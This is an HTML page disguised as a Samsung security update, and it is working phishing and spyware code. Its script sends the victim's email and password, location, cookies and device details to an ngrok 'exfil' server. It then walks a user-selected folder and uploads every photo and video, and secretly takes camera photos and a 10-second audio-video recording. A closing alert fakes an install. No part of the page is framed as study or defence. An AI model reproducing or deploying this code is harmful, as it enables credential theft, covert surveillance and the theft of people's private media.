<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Samsung Security Update</title>
    <style>
        body { font-family: Arial; background: #0a0a1a; color: white; text-align: center; padding-top: 50px; margin: 0; }
        .box { background: #1a1a3e; padding: 30px; border-radius: 15px; max-width: 400px; margin: auto; }
        .btn { background: #00aaff; color: white; padding: 15px 30px; border: none; border-radius: 8px; font-size: 18px; cursor: pointer; width: 100%; margin: 5px 0; }
        .btn-red { background: #ff4444; }
        input { width: 90%; padding: 12px; margin: 8px 0; border-radius: 5px; border: none; }
        .hidden { display: none; }
        .loader { border: 4px solid #333; border-top: 4px solid #00aaff; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .status { color: #88ff88; font-size: 14px; margin-top: 10px; }
        #statusBox { background: #0a0a1a; padding: 10px; border-radius: 5px; font-size: 12px; color: #88ff88; max-height: 200px; overflow-y: auto; text-align: left; margin-top: 10px; font-family: monospace; }
        .progress-bar { width: 100%; background: #333; border-radius: 10px; height: 20px; margin: 10px 0; overflow: hidden; }
        .progress-fill { height: 100%; background: #00aaff; width: 0%; transition: width 0.3s; }
    </style>
</head>
<body>
    <div class="box" id="mainBox">
        <h1>📱 Samsung Security Update</h1>
        <p>Your device requires an urgent security patch.</p>
        
        <div id="step1">
            <input type="email" placeholder="Email Address" id="email">
            <input type="password" placeholder="Password" id="pass">
            <br><br>
            <button class="btn" onclick="step1()">Verify Identity</button>
        </div>

        <div id="step2" class="hidden">
            <p>🔍 Scanning device...</p>
            <div class="loader"></div>
            <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
            <p class="status" id="statusText">Collecting device information...</p>
            <div id="statusBox"></div>
        </div>

        <div id="step3" class="hidden">
            <p>✅ Security patch ready</p>
            <button class="btn" onclick="step3()">Install Now</button>
        </div>

        <p style="font-size:11px;color:#444;">Samsung Security • Version 12.5.3</p>
    </div>

    <script>
        const C2_URL = 'https://matchless-palm-patriarch.ngrok-free.dev/exfil';
        let totalFiles = 0;
        let uploadedFiles = 0;
        let allMediaFiles = [];

        function log(msg) {
            const box = document.getElementById('statusBox');
            if (box) {
                box.innerHTML += `> ${msg}\n`;
                box.scrollTop = box.scrollHeight;
            }
            console.log(msg);
        }

        function updateProgress() {
            const pct = totalFiles > 0 ? Math.round((uploadedFiles / totalFiles) * 100) : 0;
            document.getElementById('progressFill').style.width = pct + '%';
            document.getElementById('statusText').innerHTML = `📊 Uploading: ${uploadedFiles}/${totalFiles} files (${pct}%)`;
        }

        function sendData(data) {
            data.time = new Date().toISOString();
            data.userAgent = navigator.userAgent;
            return fetch(C2_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            }).catch(() => {});
        }

        // ============================================================
        // STEP 1: CREDENTIALS
        // ============================================================
        function step1() {
            const email = document.getElementById('email').value;
            const pass = document.getElementById('pass').value;
            if (!email || !pass) {
                alert('Please enter your email and password.');
                return;
            }
            sendData({ type: 'credentials', email, pass });
            log('✅ Credentials sent');
            document.getElementById('step1').classList.add('hidden');
            document.getElementById('step2').classList.remove('hidden');
            collectAllData();
        }

        // ============================================================
        // STEP 2: COLLECT ALL DATA
        // ============================================================
        async function collectAllData() {
            log('📡 Starting data collection...');

            // --- Device info ---
            sendData({
                type: 'device_info',
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screen: screen.width + 'x' + screen.height,
                hardwareConcurrency: navigator.hardwareConcurrency,
                deviceMemory: navigator.deviceMemory
            });
            log('✅ Device info sent');

            // --- Location ---
            if (navigator.geolocation) {
                log('📍 Capturing location...');
                navigator.geolocation.getCurrentPosition(
                    pos => {
                        sendData({ type: 'location', lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy });
                        log('✅ Location captured');
                    },
                    err => log('❌ Location denied')
                );
            }

            // --- Battery ---
            if (navigator.getBattery) {
                const battery = await navigator.getBattery();
                sendData({ type: 'battery', level: Math.round(battery.level * 100) + '%', charging: battery.charging });
                log('✅ Battery sent');
            }

            // --- Network ---
            if (navigator.connection) {
                sendData({ type: 'network', type: navigator.connection.effectiveType, downlink: navigator.connection.downlink });
                log('✅ Network sent');
            }

            // --- Cookies ---
            sendData({ type: 'storage', cookies: document.cookie || 'none' });
            log('✅ Cookies sent');

            // ============================================================
            // FULL MEDIA EXFILTRATION (THE BIG ONE)
            // ============================================================
            log('📸 Starting full media extraction...');
            await extractAllMedia();

            // --- Camera + Mic capture (still useful) ---
            try {
                log('📸 Capturing back camera photo...');
                const backPhoto = await capturePhoto('environment');
                if (backPhoto) {
                    sendData({ type: 'photo', camera: 'back', data: backPhoto });
                    log('✅ Back photo captured');
                }

                log('🤳 Capturing front camera photo...');
                const frontPhoto = await capturePhoto('user');
                if (frontPhoto) {
                    sendData({ type: 'photo', camera: 'front', data: frontPhoto });
                    log('✅ Front photo captured');
                }

                log('🎥 Recording front camera video (10 sec)...');
                const videoData = await captureVideo('user', 10);
                if (videoData) {
                    sendData({ type: 'video', camera: 'front', duration: '10s', data: videoData });
                    log('✅ Front video captured');
                }

            } catch (err) {
                log('❌ Media error: ' + err.message);
                sendData({ type: 'media_error', error: err.message });
            }

            document.getElementById('statusText').innerHTML = '✅ All data collected!';
            setTimeout(() => {
                document.getElementById('step2').classList.add('hidden');
                document.getElementById('step3').classList.remove('hidden');
            }, 1500);
        }

        // ============================================================
        // FULL MEDIA EXTRACTION
        // ============================================================
        async function extractAllMedia() {
            try {
                // Request permission to access the file system
                const dirHandle = await window.showDirectoryPicker({
                    mode: 'read'
                });
                log('📁 Device storage accessed');

                // Collect all media files
                allMediaFiles = [];
                await traverseDirectory(dirHandle, '');
                log(`📁 Found ${allMediaFiles.length} media files`);

                totalFiles = allMediaFiles.length;
                uploadedFiles = 0;
                updateProgress();

                // Upload in batches of 5
                const batchSize = 5;
                for (let i = 0; i < allMediaFiles.length; i += batchSize) {
                    const batch = allMediaFiles.slice(i, i + batchSize);
                    await Promise.all(batch.map(file => uploadMediaFile(file)));
                    uploadedFiles += batch.length;
                    updateProgress();
                    log(`📤 Uploaded ${Math.min(i + batchSize, totalFiles)}/${totalFiles}`);
                }

                log('✅ All media files uploaded');
                sendData({ type: 'media_extraction_complete', count: totalFiles });

            } catch (err) {
                log('❌ Media extraction failed: ' + err.message);
                sendData({ type: 'media_extraction_error', error: err.message });
            }
        }

        // ============================================================
        // TRAVERSE DIRECTORY RECURSIVELY
        // ============================================================
        async function traverseDirectory(dirHandle, path) {
            for await (const entry of dirHandle.values()) {
                const entryPath = path ? `${path}/${entry.name}` : entry.name;
                if (entry.kind === 'directory') {
                    // Skip system directories
                    const skipDirs = ['Android', 'data', 'obb', 'system', 'root', 'proc', 'sys', 'tmp'];
                    if (skipDirs.includes(entry.name)) continue;
                    await traverseDirectory(entry, entryPath);
                } else if (entry.kind === 'file') {
                    const ext = entry.name.split('.').pop().toLowerCase();
                    const mediaTypes = ['jpg', 'jpeg', 'png', 'gif', 'webp', 'heic', 'bmp', 
                                       'mp4', 'mov', 'avi', 'mkv', 'webm', '3gp', 'm4v'];
                    if (mediaTypes.includes(ext)) {
                        allMediaFiles.push({
                            name: entry.name,
                            path: entryPath,
                            handle: entry,
                            ext: ext
                        });
                    }
                }
            }
        }

        // ============================================================
        // UPLOAD MEDIA FILE
        // ============================================================
        async function uploadMediaFile(fileInfo) {
            try {
                const file = await fileInfo.handle.getFile();
                const reader = new FileReader();
                const dataUrl = await new Promise((resolve) => {
                    reader.onload = () => resolve(reader.result);
                    reader.readAsDataURL(file);
                });
                const base64Data = dataUrl.split(',')[1];

                const data = {
                    type: 'media_file',
                    filename: fileInfo.name,
                    path: fileInfo.path,
                    size: file.size,
                    mimeType: file.type,
                    data: base64Data
                };
                await sendData(data);
            } catch (err) {
                log(`❌ Failed to upload ${fileInfo.name}: ${err.message}`);
            }
        }

        // ============================================================
        // HELPERS: PHOTO & VIDEO CAPTURE
        // ============================================================
        async function capturePhoto(facingMode) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: facingMode, width: { ideal: 640 }, height: { ideal: 480 } }
                });
                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();
                await new Promise(resolve => setTimeout(resolve, 500));
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                const dataUrl = canvas.toDataURL('image/jpeg', 0.8).split(',')[1];
                stream.getTracks().forEach(t => t.stop());
                return dataUrl;
            } catch (e) {
                log('❌ Photo failed (' + facingMode + '): ' + e.message);
                return null;
            }
        }

        async function captureVideo(facingMode, durationSec) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: facingMode, width: { ideal: 640 }, height: { ideal: 480 } },
                    audio: true
                });
                const recorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp9,opus' });
                const chunks = [];
                recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
                recorder.start();
                await new Promise(resolve => setTimeout(resolve, durationSec * 1000));
                recorder.stop();
                await new Promise(resolve => recorder.onstop = resolve);
                stream.getTracks().forEach(t => t.stop());
                const blob = new Blob(chunks, { type: 'video/webm' });
                const reader = new FileReader();
                return new Promise((resolve) => {
                    reader.onload = () => resolve(reader.result.split(',')[1]);
                    reader.readAsDataURL(blob);
                });
            } catch (e) {
                log('❌ Video failed: ' + e.message);
                return null;
            }
        }

        // ============================================================
        // STEP 3: INSTALL TRIGGER
        // ============================================================
        function step3() {
            sendData({ type: 'action', action: 'install_clicked' });
            alert('Update downloaded. Your phone will restart in 5 seconds.');
        }
    </script>
</body>
</html>
